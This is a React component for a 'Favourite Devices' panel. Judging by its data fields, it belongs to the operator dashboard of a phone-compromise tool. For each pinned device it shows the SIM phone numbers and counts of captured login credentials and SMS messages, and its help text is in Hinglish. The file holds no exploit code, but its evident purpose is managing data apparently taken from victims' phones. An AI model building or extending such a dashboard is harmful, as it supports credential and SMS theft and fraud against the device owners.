"use client";
import React from "react";

export default function FavouritesPanel({ data, deviceSerialMap, favourites, toggleFavourite, showToast }) {
  const devices = data.user_data || {};
  const statusData = data.device_status || {};

  const clearAll = () => {
    if (!confirm("⚠️ Remove all devices from favourites?")) return;
    favourites.forEach((id) => toggleFavourite(id));
  };

  const copyId = (id) => {
    navigator.clipboard.writeText(id);
    showToast(`📋 Copied: ${id}`, "success");
  };

  return (
    <div className="panel active">
      <div className="panel-header">
        <div>
          <h2>
            <i className="fas fa-star" style={{ color: "var(--gold)" }}></i> Favourite Devices
          </h2>
          <p className="panel-sub">Pinned devices for quick access & monitoring</p>
        </div>
        <div className="panel-stats">
          <span className="stat-item">
            <i className="fas fa-star" style={{ color: "var(--gold)" }}></i> {favourites.length} Pinned
          </span>
          {favourites.length > 0 && (
            <button className="btn-delete-all" onClick={clearAll} style={{ padding: "4px 10px" }}>
              <i className="fas fa-trash"></i> Clear All
            </button>
          )}
        </div>
      </div>

      {favourites.length === 0 ? (
        <div
          className="empty-luxury"
          style={{
            background: "linear-gradient(145deg, #181d2a, #111520)",
            border: "1px solid var(--border-color)",
            borderRadius: "var(--radius)",
            padding: "36px 20px",
          }}
        >
          <i className="fas fa-star empty-icon" style={{ color: "var(--gold)", opacity: 0.6, fontSize: 36 }}></i>
          <h4 style={{ color: "var(--text-primary)", fontSize: 16, marginBottom: 4 }}>No Favourite Devices</h4>
          <p style={{ color: "var(--text-muted)", fontSize: 12 }}>
            Devices panel me kisi bhi device card ke Star (★) icon par click karein.
          </p>
        </div>
      ) : (
        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          {favourites.map((devId) => {
            const dev = devices[devId] || {};
            const status = statusData[devId] || {};
            const serial = deviceSerialMap[devId] || 0;
            const credCount = Object.keys(data.login?.[devId] || {}).length;
            const smsCount = Object.keys(data.user_sms?.[devId] || {}).length;
            const modelName = status.device_name || dev.Device_info || dev.d_name || "Device";

            return (
              <div
                key={devId}
                className="device-card-premium online"
                style={{
                  background: "linear-gradient(145deg, #181d2a, #111520)",
                  border: "1px solid var(--border-color)",
                  borderRadius: "var(--radius)",
                  padding: "16px",
                  margin: 0,
                }}
              >
                <div
                  style={{
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    flexWrap: "wrap",
                    gap: 8,
                    marginBottom: 10,
                  }}
                >
                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                    <button
                      onClick={() => toggleFavourite(devId)}
                      style={{
                        background: "transparent",
                        border: "none",
                        color: "var(--gold)",
                        fontSize: 18,
                        cursor: "pointer",
                      }}
                    >
                      <i className="fas fa-star"></i>
                    </button>
                    <span style={{ fontSize: 14, fontWeight: 700, color: "var(--gold-light)" }}>
                      📱 {modelName}
                    </span>
                    <span className="device-id">{devId.slice(0, 10)}...</span>
                    {serial > 0 && <span className="serial-badge-premium">S-{serial}</span>}
                  </div>

                  <div style={{ display: "flex", gap: 6 }}>
                    <button
                      className="copy-device-id-btn"
                      onClick={() => copyId(devId)}
                    >
                      <i className="fas fa-copy"></i> Copy ID
                    </button>
                    <button
                      onClick={() => toggleFavourite(devId)}
                      className="btn-sm"
                      style={{
                        background: "rgba(239, 68, 68, 0.15)",
                        color: "var(--red)",
                        padding: "3px 8px",
                        borderRadius: 6,
                      }}
                    >
                      Remove
                    </button>
                  </div>
                </div>

                <div className="info-grid-premium" style={{ margin: 0 }}>
                  <div className="info-item-premium">
                    <span className="info-label">SIM 1</span>
                    <span className="info-value">{dev.numberSim1 || "N/A"}</span>
                  </div>
                  <div className="info-item-premium">
                    <span className="info-label">SIM 2</span>
                    <span className="info-value">{dev.numberSim2 || "N/A"}</span>
                  </div>
                  <div className="info-item-premium">
                    <span className="info-label">Credentials</span>
                    <span className="info-value highlight">{credCount}</span>
                  </div>
                  <div className="info-item-premium">
                    <span className="info-label">SMS Count</span>
                    <span className="info-value">{smsCount}</span>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}
